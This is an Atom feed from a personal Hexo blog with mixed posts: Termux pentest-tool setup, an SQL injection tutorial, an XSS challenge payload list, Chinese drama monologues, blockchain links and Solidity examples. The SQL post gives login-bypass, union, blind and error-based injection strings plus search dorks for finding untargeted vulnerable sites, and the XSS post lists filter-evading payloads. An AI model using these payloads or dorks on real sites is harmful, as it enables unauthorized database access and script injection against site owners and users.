<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://tea9.coding.me/"/>
  <updated>2018-10-12T21:29:06.298Z</updated>
  <id>http://tea9.coding.me/</id>
  
  <author>
    <name>tea9</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>hexo_course</title>
    <link href="http://tea9.coding.me/2018/10/13/2018-10-13-hexo_course/"/>
    <id>http://tea9.coding.me/2018/10/13/2018-10-13-hexo_course/</id>
    <published>2018-10-12T16:00:00.000Z</published>
    <updated>2018-10-12T21:29:06.298Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">hexo-cn-docs</a><br><a href="https://jaredforsyth.com/hexo-admin/" target="_blank" rel="noopener">hexo-admin</a><br><a href="https://github.com/theme-next/hexo-theme-next" target="_blank" rel="noopener">hexo-next github</a><br><a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">next-cn-docs</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://hexo.io/zh-cn/docs/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;hexo-cn-docs&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://jaredforsyth.com/hexo-admin/&quot; t
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://tea9.coding.me/2018/10/12/hello-world/"/>
    <id>http://tea9.coding.me/2018/10/12/hello-world/</id>
    <published>2018-10-12T11:49:08.737Z</published>
    <updated>2018-10-12T11:49:08.737Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>termux相关</title>
    <link href="http://tea9.coding.me/2018/10/12/2018-10-12-termux_course/"/>
    <id>http://tea9.coding.me/2018/10/12/2018-10-12-termux_course/</id>
    <published>2018-10-11T16:00:00.000Z</published>
    <updated>2018-10-12T07:51:16.077Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>Termux是一款开源且不需要root，运行在Android终端上极其强大的linux模拟器，支持apt管理软件包，完美支持python,ruby,go,nodejs。本文使用termux搭建Nmap、Sqlmap、BBScan、subDomainsBrute、Hydra、RouterSploit等实现支持端口扫描、注入检测、子域名爆破、多协议弱口令爆破、路由器漏洞检测框架多种功能的Android手机渗透神器。  </p><h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><ul><li>下载地址</li></ul><p><a href="https://play.google.com/store/apps/details?id=com.termux" target="_blank" rel="noopener">Termux GooglePlay</a>  </p><p><a href="https://www.youtube.com/playlist?list=PLbg6BPamoIGbXR52TdQAJwTkeDw8E6hIf" target="_blank" rel="noopener">Termux Youtube</a>  </p><ul><li>资料地址</li></ul><p><a href="https://pan.baidu.com/s/1dpdn0vvA-aKQPmJCRLgSxQ" target="_blank" rel="noopener">链接:</a><br>提取码: y27f  </p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p><strong>Jupyter Notebook</strong>  </p><pre><code>jupyter notebook --ip=0.0.0.0</code></pre><p><strong>Sqlmap</strong></p><pre><code>cd sqlmappython2 sqlmap.py -h</code></pre><p><strong>whatportis</strong><br>whatportis是一款离线查询端口号对应服务的工具  </p><pre><code>whatportis 3306</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h2&gt;&lt;p&gt;Termux是一款开源且不需要root，运行在Android终端上极其强大的linux模拟器，支持apt管理软件包，完美支持pyth
      
    
    </summary>
    
      <category term="安全" scheme="http://tea9.coding.me/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全 termux" scheme="http://tea9.coding.me/tags/%E5%AE%89%E5%85%A8-termux/"/>
    
  </entry>
  
  <entry>
    <title>sql注入基础</title>
    <link href="http://tea9.coding.me/2018/10/11/2018-10-11-sql_inject_basic/"/>
    <id>http://tea9.coding.me/2018/10/11/2018-10-11-sql_inject_basic/</id>
    <published>2018-10-10T16:00:00.000Z</published>
    <updated>2018-10-12T01:09:38.503Z</updated>
    
    <content type="html"><![CDATA[<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><!-- MarkdownTOC --><ul><li>SQL注入原理<ul><li>SQL注入原理-SQL注入产生原因</li><li>SQL注入原理-SQL注入核心原理</li></ul></li><li>mysql注入语句<ul><li>mysql注入语句-mysql介绍</li><li>mysql注入语句-万能密码</li><li>mysql注入语句-注入语句例子</li></ul></li><li>sql注入流程</li><li>相关链接</li></ul><!-- /MarkdownTOC --><h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><h3 id="SQL注入原理-SQL注入产生原因"><a href="#SQL注入原理-SQL注入产生原因" class="headerlink" title="SQL注入原理-SQL注入产生原因"></a>SQL注入原理-SQL注入产生原因</h3><blockquote><p>基于B/S架构的网络上，对安全控制能力较弱，然后开发人员水平和经验参差不齐，没有对用户输入数据，或者对页面中携带的信息进行必要的判断。攻击者利用这个机会提交一段数据库查询代码，可以获得一些数据库信息。</p></blockquote><h3 id="SQL注入原理-SQL注入核心原理"><a href="#SQL注入原理-SQL注入核心原理" class="headerlink" title="SQL注入原理-SQL注入核心原理"></a>SQL注入原理-SQL注入核心原理</h3><blockquote><p>SQL注入是一种将恶意的SQL代码插入到用户的输入参数中的攻击，攻击者探测出开发者编程过程中的漏洞，利用漏洞，巧妙的构造SQL语句，对数据库的内容进行检索或修改。</p></blockquote><hr><blockquote><p>灵活的SQL查询语句+用户输入的数据带入可执行SQL语句=用户直接操作数据库-&gt;SQL注入漏洞</p></blockquote><h2 id="mysql注入语句"><a href="#mysql注入语句" class="headerlink" title="mysql注入语句"></a>mysql注入语句</h2><h3 id="mysql注入语句-mysql介绍"><a href="#mysql注入语句-mysql介绍" class="headerlink" title="mysql注入语句-mysql介绍"></a>mysql注入语句-mysql介绍</h3><blockquote><p>MySQL是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MySQL 是最流行的关系型数据库管理系统之一，在 WEB 应用方面，MySQL是最好的 RDBMS (Relational Database Management System，关系数据库管理系统) 应用软件。<br>MySQL是一种关系数据库管理系统，关系数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。<br>MySQL所使用的 SQL 语言是用于访问数据库的最常用标准化语言。MySQL 软件采用了双授权政策，分为社区版和商业版，由于其体积小、速度快、总体拥有成本低，尤其是开放源码这一特点，一般中小型网站的开发都选择 MySQL 作为网站数据库。</p></blockquote><p>– 摘自百度百科  </p><h3 id="mysql注入语句-万能密码"><a href="#mysql注入语句-万能密码" class="headerlink" title="mysql注入语句-万能密码"></a>mysql注入语句-万能密码</h3><pre><code># 登录处正常的SQL语句：select * from users where username= &apos;admin&apos; and pwd = &apos;pass&apos;;# 万能密码：&apos;or &apos;1&apos; = &apos;1 # 带入用户输入参数select * from users where username= &apos;&apos;or &apos;1&apos; = &apos;1&apos; and pwd = &apos;&apos;or &apos;1&apos; = &apos;1&apos;;第一个 or 前面为 false 后面为 true -&gt; trueand 前面为 true 后面为 false -&gt; false第二个 or 前面为 false 后面为 true -&gt; true</code></pre><h3 id="mysql注入语句-注入语句例子"><a href="#mysql注入语句-注入语句例子" class="headerlink" title="mysql注入语句-注入语句例子"></a>mysql注入语句-注入语句例子</h3><pre><code># 利用构造1=2错误执行union后面的语句and 1=2 union select 1,2,3--# 利用mysql正则表达式为匹配当前用户是否为ro开头select user() regexp &apos;^ro&apos;# 查询当前用户的ascii码是否为114（r）ascii(substr(substr(select user()),1,1))=114# 如果当前用户的ascii码为114（r） 就返回0 否则就睡5秒if(ascii(substr((select user()),1,1))=114,0,sleep(5))# 查询第一个表名的ascii码是否为99（c） 是返回1 否返回0(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=99)# 利用updatexml报错，返回版本信息updatexml(1,concat(0x7e,(select @@version),0x7e),1)</code></pre><h2 id="sql注入流程"><a href="#sql注入流程" class="headerlink" title="sql注入流程"></a>sql注入流程</h2><ol><li><p><strong>目标搜集：</strong><br> 无特定目标：  </p><pre><code>inurl:php?id=</code></pre><p> 有特定目标：  </p><pre><code>inurl:php?id= site:target.com</code></pre><p> 工具爬取：  </p><pre><code>spider，对搜索引擎和目标网站的链接进行爬取</code></pre></li><li><p><strong>注入识别：</strong><br> 手工简单识别：  </p><pre><code>&apos;and 1=1 / and 1=2and &apos;1&apos; =&apos;1 / and &apos;1&apos;=&apos;2and 1 like 1 / and 1 like 2</code></pre><p> 工具识别：  </p><pre><code>sqlmap -m filename (filename中保存检测目标)sqlmap --crawl (sqlmap对网站进行爬取，然后依次进行测试)</code></pre></li></ol><ol start="3"><li><p><strong>高级识别：</strong>  </p><p> 扩展识别广度和深度：  </p><pre><code>sqlmap --level 增加测试级别，对header中相关参数也进行测试sqlmap -r filename(filename中为网站请求数据)</code></pre><p> 利用工具提高识别效率：  </p><pre><code>BurpSuite + SqlMap</code></pre><p> Tips:  </p><pre><code>可以在参数后键入 “*” 来确定想要测试的参数  可能出现注入的点：新闻、登录、搜索、留言......  站在开发的角度去寻找  </code></pre></li><li><p><strong>代码审计：</strong>  </p><p> 搜索关键代码和函数  </p><pre><code>关键代码包括 $_GET/$_POST/$id/select/SELECT</code></pre><p> 梳理业务流程  </p></li></ol><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a href="https://www.mysql.com/" target="_blank" rel="noopener">mysql官网</a><br><a href="https://dev.mysql.com/doc/refman/5.7/en/dynindex-function.html" target="_blank" rel="noopener">mysql内置函数</a><br><a href="http://ascii.911cha.com/" target="_blank" rel="noopener">ascii对照表</a><br><a href="http://www.runoob.com/mysql/mysql-regexp.html" target="_blank" rel="noopener">mysql正则</a><br><a href="https://blog.csdn.net/vspiders/article/details/77430024" target="_blank" rel="noopener">MYSQL updatexml报错注入</a><br><a href="https://blog.csdn.net/i_peter/article/details/53380334" target="_blank" rel="noopener">Python Spider 的总结</a>  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;目录&quot;&gt;&lt;a href=&quot;#目录&quot; class=&quot;headerlink&quot; title=&quot;目录&quot;&gt;&lt;/a&gt;目录&lt;/h2&gt;&lt;!-- MarkdownTOC --&gt;
&lt;ul&gt;
&lt;li&gt;SQL注入原理&lt;ul&gt;
&lt;li&gt;SQL注入原理-SQL注入产生原因&lt;/li&gt;
&lt;li&gt;
      
    
    </summary>
    
      <category term="web安全" scheme="http://tea9.coding.me/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全 sql注入" scheme="http://tea9.coding.me/tags/web%E5%AE%89%E5%85%A8-sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>xss的语句</title>
    <link href="http://tea9.coding.me/2018/10/05/2018-10-05-xss_note/"/>
    <id>http://tea9.coding.me/2018/10/05/2018-10-05-xss_note/</id>
    <published>2018-10-04T16:00:00.000Z</published>
    <updated>2018-10-10T22:37:10.650Z</updated>
    
    <content type="html"><![CDATA[<p>这是一个xss的闯关游戏  </p><p><a href="https://pan.baidu.com/s/1bqtFVGrc4TlihuWT2TBxtQ" target="_blank" rel="noopener">下载链接:</a><br>提取码: isre  </p><p>xss的语句</p><pre><code>1&lt;script&gt;alert(/xss/)&lt;/script&gt;2&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;3&apos;onmouseover=&apos;alert(/xss/)&apos;4&quot; oninput=alert`xss`//&quot; onfocus=alert`xss` autofocus= &quot;&quot; onchange=alert`xss` &quot;&lt;img src=x onerror=alert(/xss/)&gt;5&quot;&gt;&lt;a href=javascript:alert(/xss/)&gt;6&quot;&gt;&lt;A HREF=javascript:alert(/xss/)&gt;7&quot;&gt;&lt;scrscriptipt&gt;alert(/xss/)&lt;/scscriptript&gt;8html 字符实体编码转换java&amp;#x73;cript:alert(1)9java&amp;#x73;cript:alert(1)/*http://*/10&amp;t_sort=a&quot; onclick=&quot;alert(1)&quot;15urlencode%0a%0d&lt;img%0asrc=xx%0aonerror=alert(/xss/)&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这是一个xss的闯关游戏  &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://pan.baidu.com/s/1bqtFVGrc4TlihuWT2TBxtQ&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;下载链接:&lt;/a&gt;&lt;br&gt;提取码: isre  &lt;/
      
    
    </summary>
    
      <category term="web安全" scheme="http://tea9.coding.me/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="xss web安全" scheme="http://tea9.coding.me/tags/xss-web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>cv古风剧本</title>
    <link href="http://tea9.coding.me/2018/09/23/2018-09-23-cv_note/"/>
    <id>http://tea9.coding.me/2018/09/23/2018-09-23-cv_note/</id>
    <published>2018-09-22T16:00:00.000Z</published>
    <updated>2018-09-26T03:28:01.539Z</updated>
    
    <content type="html"><![CDATA[<!--突然迷上了！！！！，嗯，为我无聊的生活，增一点趣味，想听我念吗？ 别想了 不存在的--><blockquote><p>突然迷上</p></blockquote><pre><code>湘灵：还记得这个地方吗？是否记得那一日，春光似酒浓，花故醉人香。  枫岫：姑娘大费周章，布置这一切，所为何来？  湘灵：呵，当年我们初逢醉花亭，一见如故，相谈甚欢，此后三日，朝起夕落，   秉烛促膝，共赏烟柳，共渡流光，我这样说，是否唤醒先生少许回忆呢？  枫岫：姑娘所言已是旧事  湘灵：虽是萍水相逢，但离别之际我曾问你，待来年春暖时节，可愿再叙？你当时回答：看罢春色终无味，秋霜丹叶更风情。因为这句，第二年枫红时节，我便在醉花亭中等候数个日夜，然而先生始终没有出现。枫岫：那一句话，算不得承诺湘灵：我明白，那句话不是承诺，只是忘情。我不辞千里，从四其界来到苦境，就是为了你。枫岫：我不明白湘灵：你说过，命运皆由自己掌握，幸福皆由自己开拓，如今我已打破樊篱，脱身牢笼，飞向向往的天空。枫岫：这与我何关？湘灵：在新的地方，新的身份，你我的缘份正要开始，我的目标就是你。跟随你的脚步，期待终有一天，能与你并肩同行枫岫：姑娘...湘灵：我的目的，就是先生的心枫岫：你知道你在说什么吗？你对我根本不熟悉。湘灵：我对你的熟悉，远比你所想还多，你以为我是欣赏你的文采，进而仰慕迷恋你吗？枫岫：难道不是？湘灵：当然不是，真正吸引我的，不是因为你出众的文采，或是精湛的内容，而是你的灵魂-----蝶澈(独白)我叫蝶澈，出生在巫乐族。我最喜欢的小哥哥名字叫迟墨，他是我们巫乐族的年龄最小的男孩子，我的小哥哥和我一样，是个灵力高强的孩子……他教我各种各样的幻术，教我怎样控制幻化成光线的琴弦，温柔的眉眼，微笑的唇角…… 迟墨：蝶澈，你想过要飞到天空上面去看一看吗？我想知道，云朵上是开满了樱花，抑或是住满了亡灵。 蝶澈：（独白）我是我父皇的骄傲，可是迟墨不是，父皇不喜欢他…… 迟墨：为什么那些鸟儿可以在天空里面自由地飞翔，而我却必须在风里面那么懦弱？ 蝶澈：（独白）迟墨总是望着冰海对岸的方向很长时间不说话，他背对着我，我看不到他的眼睛，不过我可以想象，他的眼睛里面肯定落满了天空上飞鸟的影子。 迟墨：蝶澈，你想和我一起离开吗？ 蝶澈：哥，你去哪我都跟着。 迟墨：（低声）蝶澈，我哪儿也不去，别忘记了，你是父皇最心爱的女儿。 蝶澈：（独白）我终于在祭坛的下面暗室中见到了我的哥哥迟墨，他被几把冰剑钉在厚厚的玄武岩墙壁上，红色的血液沿着那些穿刺他胸膛的冰冷源源不断地流淌下来，曼延在冰冷的地面上……他的表情没有痛苦和怨恨，依然平静而充满感恩。 迟墨：你已经知道一切了吧？ 蝶澈：知道了，小哥哥。 迟墨：蝶澈，不要难过，我从来没有恨过父皇，更加喜欢你。我能够来这个世界上走一次，已经觉得很幸运了，请带我照顾父皇，照顾巫乐族的每一个人。 蝶澈：（独白）第三把冰剑洞穿他的胸膛，我听见血肉模糊的声音，沉闷如同粘稠的岩浆汩汩流动。 我看到哥哥皱紧的眉毛心如刀割。 迟墨：蝶澈，不要难过，还有两把冰凌。然后我就可以睡会了。 蝶澈：王为什么要对你这么残忍，我不允许。（独白）我走过去，召唤出手中的冰剑，一剑洞穿了他的咽喉。 迟墨：蝶澈，为什么这么傻，为了我而犯法典？ 蝶澈：（独白）我最爱的哥哥……请你原谅我，我要离开了，离开这个纷扰的宫殿，离开这个埋葬了我苍翠年华的幻影之城。也许天的尽头，我会再次看见你的亡灵，那个时候，请你对我微笑，如同撕裂朝阳一样的微笑，让我可以笑着流完我的眼泪，然后让我听见你自由的，歌唱…… ----- 前世，你和我一同相逢在轮回路上，那一刻，我就已经深深地将你的容颜铭记，镌刻在属于你和我的来世素笺上。　　今生，你和我一同巧遇在古城径边，那一眼，我仍如此痴痴地将你的身影凝望，描绘在属于你和我的传奇长卷中。　　前世的五百次回眸，才换得与你今生的擦肩而过。不知为何，我会如此深沉的将你记起…也许，在那五百次的思念中，在那五百次的回眸中，我已经累了，我已经倦了，我不想单单只是用回眸来念你，用思念来爱你，所以我要和你执手相依，然后同度漫漫红尘路，白头偕老。　　我恨，为什么偏要我用五百次的回眸，才换得你今生的相守，我是多么的不甘，但我还是那样照做了，因为你是我喝下的一味情毒，我宁愿用回眸和思念来减轻爱你带来的伤痛，我宁愿那满带温柔的剧毒残忍地将我腐蚀掉，也不愿无情的岁月模糊你在我心中的绝世容颜。　　如今，你平静的选择离我而去，仿若一阵风从我的世界里悄然消失，前世五百次对你的回眸变成一纸流烟消散，空落下满地凄凉，满地悲伤，我枕着孤独入睡，数着你给的伤痛度日，思念成疾。　　思念，无日无夜的纠缠着我，伤痛，无止无休的侵蚀着我，那干涩的回忆，早已绵延成一条忧伤沉淀的长河，在那被历史风干的角落里，孤独的流淌，孤独的吟唱，曾时相守无猜的时光，被一幕幕回放，被一幕幕拉长…　　回忆中，你的眸凝如春风明媚，带着我的丝丝眷念；　　回忆中，你的唇艳似朝霞火红，带着我的凄凄缠绵；　　回忆中，你的笑甜比清水可人，带着我的点点依恋；　　依稀那年，微风轻轻地吹着，吹着你墨黑的长发，你和我站在柳湖边，看着那一对戏水的鸳鸯默默无言，时间仿佛静止了一般慢慢地蹒跚踱步，那是一段能够让人欢喜流泪的时光啊！那时候，你不知道我在想着，想着在前世的五百次回眸中我的心思，希望能在来世和你就这样相依静默，梳理着幽远宁静的时光，而这一刻，我终于实现了。　　依稀那年，宁静的夜色委婉的映照在你清秀的脸上，月光如洗，流年静默，你依在我的身旁，啊，那一刻，我爱上了你，只用了一瞬间的时间，我是多么的幸福啊？如果没有前世那五百次对你的回眸，时间是否会为我们停留？也许，所有的一切都将被时间掩埋，碎成一丝残梦，我喜欢和你这样相守，等着你悠悠翻开前世我为你书写的那一封爱的素笺。</code></pre><h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://tieba.baidu.com/p/4633724261?red_tag=0052093016" target="_blank" rel="noopener">【宫妃祭】论那些精美的古风独白</a><br><a href="https://y.qq.com/n/yqq/song/002QopfF3YHIML.html" target="_blank" rel="noopener">百鬼夜行</a>  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!--突然迷上了！！！！，嗯，为我无聊的生活，增一点趣味，想听我念吗？ 别想了 不存在的--&gt;
&lt;blockquote&gt;
&lt;p&gt;突然迷上&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;湘灵：还记得这个地方吗？是否记得那一日，春光似酒浓，花故醉人香。  
枫岫：姑娘大
      
    
    </summary>
    
      <category term="cv" scheme="http://tea9.coding.me/categories/cv/"/>
    
    
      <category term="cv" scheme="http://tea9.coding.me/tags/cv/"/>
    
  </entry>
  
  <entry>
    <title>区块链学习</title>
    <link href="http://tea9.coding.me/2018/09/16/2018-09-16-learn_block_chain/"/>
    <id>http://tea9.coding.me/2018/09/16/2018-09-16-learn_block_chain/</id>
    <published>2018-09-15T16:00:00.000Z</published>
    <updated>2018-09-27T01:27:10.110Z</updated>
    
    <content type="html"><![CDATA[<h2 id="比特币"><a href="#比特币" class="headerlink" title="比特币"></a>比特币</h2><p><a href="https://btc.com" target="_blank" rel="noopener">比特币区块</a>  </p><p><a href="https://anders.com/blockchain/" target="_blank" rel="noopener">区块链概念</a>   </p><p><a href="https://bitcoin.org/zh_CN/download" target="_blank" rel="noopener">钱包</a>  </p><p><a href="https://www.8btc.com/article/25065" target="_blank" rel="noopener">比特币总量</a>  </p><p><a href="https://www.bitcoincash.org" target="_blank" rel="noopener">BCT官网</a>  </p><p><a href="https://www.feixiaohao.com" target="_blank" rel="noopener">数字货币价格查询</a>  </p><p><a href="http://www.btc798.com/articles/14863.html" target="_blank" rel="noopener">BTC历史分叉</a>  </p><p><a href="http://www.sohu.com/a/216330641_481485" target="_blank" rel="noopener">ETH和EOS差异</a>  </p><p><a href="https://www.blockchain.com/zh-cn/wallet#/" target="_blank" rel="noopener">网页版钱包</a>  </p><p><a href="https://www.cybtc.com/article-2997-1.html" target="_blank" rel="noopener">区块链专利排名</a>  </p><p><strong>区块链项目</strong></p><p><a href="https://bitrating.com/blockchain/85408.html" target="_blank" rel="noopener">支付宝爱心捐赠平台</a>  </p><p><a href="https://www.cryptokitties.co" target="_blank" rel="noopener">区块链游戏-CryptoKitties迷恋猫</a>  </p><p><a href="http://c-chain.baidu.com/eco/index#/" target="_blank" rel="noopener">版权保护-百度图腾</a><br><a href="http://www.chinaz.com/news/2018/0412/872765.shtml" target="_blank" rel="noopener">百度图腾介绍</a>  </p><hr><h2 id="以太坊"><a href="#以太坊" class="headerlink" title="以太坊"></a>以太坊</h2><p><a href="https://etherscan.io" target="_blank" rel="noopener">eth</a>  </p><p><a href="https://solidity.readthedocs.io" target="_blank" rel="noopener">solidity</a>  </p><p><a href="https://remix.ethereum.org" target="_blank" rel="noopener">remix IDE</a>  </p><p><a href="https://www.myetherwallet.com/helpers.html" target="_blank" rel="noopener">以太坊单位换算</a>  </p><p><a href="http://me.tryblockchain.org" target="_blank" rel="noopener">solidity API博客</a>  </p><p><a href="http://www.tryblockchain.org" target="_blank" rel="noopener">solidity翻译API</a>  </p><p><a href="#">Hyperledger Fabric</a> </p><hr><h2 id="EOS"><a href="#EOS" class="headerlink" title="EOS"></a>EOS</h2><p><a href="https://github.com/EOSIO/eos" target="_blank" rel="noopener">eos</a>    </p><p><a href="http://blog.eosdata.io/index.php/tag/eos/" target="_blank" rel="noopener">EOS区块链开发指南</a>  </p><p><a href="https://www.jianshu.com/p/011c8f12857b" target="_blank" rel="noopener">EOS应用开发入门</a>  </p><p><a href="https://www.jianshu.com/p/f65bf7691482" target="_blank" rel="noopener">EOS中文白皮书</a>  </p><p><a href="https://blog.csdn.net/baidang201/article/details/76861624" target="_blank" rel="noopener">eos的石墨烯技术是什么</a>  </p><p><a href="https://eos.io/" target="_blank" rel="noopener">eosio</a>  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;比特币&quot;&gt;&lt;a href=&quot;#比特币&quot; class=&quot;headerlink&quot; title=&quot;比特币&quot;&gt;&lt;/a&gt;比特币&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://btc.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;比特币区块&lt;/a&gt;
      
    
    </summary>
    
      <category term="区块链" scheme="http://tea9.coding.me/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
      <category term="区块链" scheme="http://tea9.coding.me/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>solidity的代码</title>
    <link href="http://tea9.coding.me/2018/09/16/2018-09-16-solidity_base_code/"/>
    <id>http://tea9.coding.me/2018/09/16/2018-09-16-solidity_base_code/</id>
    <published>2018-09-15T16:00:00.000Z</published>
    <updated>2018-09-28T07:17:23.055Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://remix.ethereum.org" target="_blank" rel="noopener">在线solidityIDE</a><br><a href="https://solidity.readthedocs.io" target="_blank" rel="noopener">solidity</a>  </p><h2 id="类-amp-函数"><a href="#类-amp-函数" class="headerlink" title="类&amp;函数"></a>类&amp;函数</h2><pre><code>pragma solidity ^0.4.25;contract Demo1{    // 创建一个函数    function shwo(int num) public returns(int,int){        return (num,num+1);    }}</code></pre><h2 id="int-amp-uint"><a href="#int-amp-uint" class="headerlink" title="int&amp;uint"></a>int&amp;uint</h2><pre><code>pragma solidity ^0.4.25;contract IntDemo{    // 主要演示 int uint 的相关特性 ，如果没有指定步长默认是 int --&gt; int256    function demo01() returns (int,uint,int){        int8 num = -128; // 1个字节8位，最高位为符号位 128～127        uint8 num2 = 255; // 1个字节8位，都是用来存储数据 0～255 0000 0000 - 1111 1111        var num3 = num;        return (num,num2,num3);    }}</code></pre><h2 id="属性-amp-函数"><a href="#属性-amp-函数" class="headerlink" title="属性&amp;函数"></a>属性&amp;函数</h2><pre><code>pragma solidity ^0.4.25;// 属性、函数、访问修饰符contract AttrFnDemo{    // 属性的默认访问修饰符：internal，但是函数默认访问修饰符public    uint private _age; // private 仅仅当前合约可以访问    string internal _name; // 当前合约和子合约可以访问    int public _num; // 外部可以直接调用    function AttrFnDemo(uint age,string name,int num){        // this 代表当前合约（地址），但是不能直接和属性名称使用        _age = age;        _name = name;        _num = num;    }    // 构造函数在智能合约中不支持多态（重载）    // function AttrFnDemo() {}    function age() private returns (uint){        return _age;    }    function name() internal returns (string){        return _name;    }    function num() public returns (int) {        return _num;    }    // 没有指定访问修饰符，默认为public    function show() returns (uint,string,int){        return (_age,name(),_num);    }    // solidity 默认普通的函数是支持多态性（重载）    // function show(int x) returns (uint,string,int){    //     return (_age,name(),_num);    // }}</code></pre><h2 id="继承-amp-接口"><a href="#继承-amp-接口" class="headerlink" title="继承&amp;接口"></a>继承&amp;接口</h2><pre><code>pragma solidity ^0.4.25;interface Wifi{ // 定义接口，函数只有声明，没有实现    function wifi() public returns(string);}interface BlueTooth{    function blue() public returns(string);}// solidity中，没有abstract，拥有抽象函数的合约就是抽象合约（不能够实例化）contract Phone{    // 抽象合约是不能够实例化    function start() internal returns (string){        return &quot;start phone&quot;;    }    // 实现手机关机的功能    function close() internal returns (string){        return &quot;close phone&quot;;    }    // 由于闹钟每个手机实现不相同，因此定义为抽象函数    function alarm() internal returns (string);}// Mi手机，实现闹钟，Wifi功能contract Mi is Phone,Wifi{ // 继承与实现都可以使用is    function wifi() public returns(string){        return &quot;Mi is show wifi&quot;;    }    function alarm() internal returns(string){        return &quot;Mi is show alarm&quot;;    }    function show() returns (string,string){        return (wifi(),alarm());    }}// Iphone手机，实现全部功能contract Iphone is Phone,Wifi,BlueTooth{    function wifi() public returns(string){        return &quot;Iphone is show wifi&quot;;    }    function alarm() internal returns(string){        return &quot;Iphone is show alarm&quot;;    }    function blue() public returns(string){        return &quot;Iphone is show blue&quot;;    }    function show() returns (string,string){        return (start(),close());    }}</code></pre><h2 